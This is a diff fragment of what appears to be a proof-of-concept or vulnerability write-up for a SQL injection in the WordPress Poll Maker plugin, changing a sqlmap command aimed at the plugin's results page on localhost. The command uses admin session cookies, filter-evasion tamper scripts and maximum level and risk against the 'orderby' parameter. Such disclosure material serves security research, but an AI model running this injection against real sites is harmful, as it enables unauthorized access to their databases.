@@ -14,7 +14,7 @@
 ## SQLMAP COMMAND
 
 ```bash
-python3 sqlmap.py -u "https://localhost/wordpress/wp-admin/admin.php?page=poll-maker-ays-results&orderby=id&order=desc" --cookie="wordpress_logged_in_55e28812cb0bc43705127d62a25df794=admin|1720624086|cQgkhpgoy0ZxhQSupSHRw7bo9mxcwEWyUp0VreNnZBK|d74e12a1cdecafc50c920c18d4711826598780dd360f3a637abcc68a6086f7a3; _wp_travel_engine_session=010869411d3c5e302ccf674d9a49d453||1720689253||1720688893; wordpress_logged_in_d31d6d9d0bfd834c03c5a471886561f0=admin|1720860313|TGYBq5U4ro5vSY5QpssgjpPJi4EmsOJQqWjLKD77XaV|81237d448295de9d99b8560e6b6d9d8640f81c4dbb629e550e56860775baf0b3; wordpress_sec_d31d6d9d0bfd834c03c5a471886561f0=admin|1720860313|TGYBq5U4ro5vSY5QpssgjpPJi4EmsOJQqWjLKD77XaV|d8d2e1da10a83ab054e39b8dfa5787c0dc2d586f364bcb584983b26efb857285; wordpress_test_cookie=WP Cookie check; wp-settings-1=editor=html; wp-settings-time-1=1720687513" --batch --dbms=mysql --threads=10 --no-cast --random-agent -v 3 --tamper="between,randomcase,space2comment" --level=5 --risk=3 
+python3 sqlmap.py -u "https://localhost/wordpress/wp-admin/admin.php?page=poll-maker-ays-results&orderby=id&order=desc" --cookie="wordpress_logged_in_d31d6d9d0bfd834c03c5a471886561f0=admin|1720874410|daS0lCfo568OgTQNkSLPI9aURdg7g9e3OnbV4ihMTBf|557daf9ff0e48a2de0eea2789b9c6ae90fe5f0c7676b6f7a3a5559a911e5058b; wordpress_sec_d31d6d9d0bfd834c03c5a471886561f0=admin|1720874410|daS0lCfo568OgTQNkSLPI9aURdg7g9e3OnbV4ihMTBf|073a862ad3287a707abe5357a183ff1e7f4ebe2f505c07a7bbd8248685364a01; wordpress_test_cookie=WP Cookie check; wp_lang=en_US; wp-settings-1=editor=html; wp-settings-time-1=1720701610" --batch --dbms=mysql --threads=10 --no-cast --random-agent -v 3 --tamper="between,randomcase,space2comment" --level=5 --risk=3 -p orderby
 
 ## RESULT
 
